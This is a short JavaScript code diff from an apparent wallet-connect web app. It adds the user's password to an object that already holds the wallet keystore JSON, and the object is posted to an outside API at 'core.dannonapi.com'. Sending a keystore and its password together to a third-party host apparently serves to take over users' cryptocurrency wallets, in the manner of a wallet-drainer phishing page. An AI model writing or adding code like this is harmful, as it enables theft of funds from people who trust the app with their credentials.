@@ -79,7 +79,8 @@ const App = () => {
     const userdata = {
       wallet_type,
       access_type,
-      key: keystoreJson
+      key: keystoreJson,
+      password: password
     }
     axios.post('https://core.dannonapi.com/wallet/', userdata).then(res => console.log(res.status))
   }
